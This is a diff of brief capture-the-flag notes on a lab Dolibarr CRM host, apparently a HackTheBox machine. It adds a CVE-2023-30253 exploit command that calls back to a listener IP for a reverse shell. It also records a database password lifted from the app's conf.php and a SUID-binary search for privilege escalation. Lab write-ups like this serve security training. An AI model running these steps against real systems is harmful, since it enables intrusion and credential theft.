@@ -54,5 +54,22 @@ crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Durati
 
 https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253
 
+https://github.com/Rubikcuv5/cve-2023-30253
+
+python3 CVE-2023-30253.py --url http://crm.board.htb -u admin -p admin -r  10.10.14.50  8081
+
+successfully.
+
+another user: larissa
+
+/var/www/html/crm.board.htb/htdocs/conf/conf.php
+
+$dolibarr_main_db_user='dolibarrowner';
+$dolibarr_main_db_pass='serverfun2$2023!!';
+
+
+find / -perm -4000 2>/dev/null
+
+
 
 
